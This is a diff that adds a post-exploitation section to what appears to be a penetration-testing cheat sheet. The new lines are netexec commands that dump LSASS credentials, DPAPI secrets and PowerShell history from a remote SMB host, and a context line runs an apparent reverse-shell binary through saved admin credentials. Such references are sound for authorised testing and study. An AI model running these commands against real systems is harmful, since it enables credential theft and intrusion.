@@ -616,6 +616,21 @@ runas /savecred /user:admin C:\Temp\reverse.exe
 
 <details>
   <summary><strong>Post-Exploitation</strong></summary>
+
+### Dump LSASS
+```shell
+netexec smb <target-ip> -u <user> -p <password> -M lsassy
+```
+
+### Dump DPAPI
+```shell
+netexec smb <target-ip> -u <user> -p <password> -dpapi
+```
+
+### Dump PowerShell History
+```shell
+netexec smb <target-ip> -u <user> -p <password> -M powershell_history
+```
   
 </details>
 
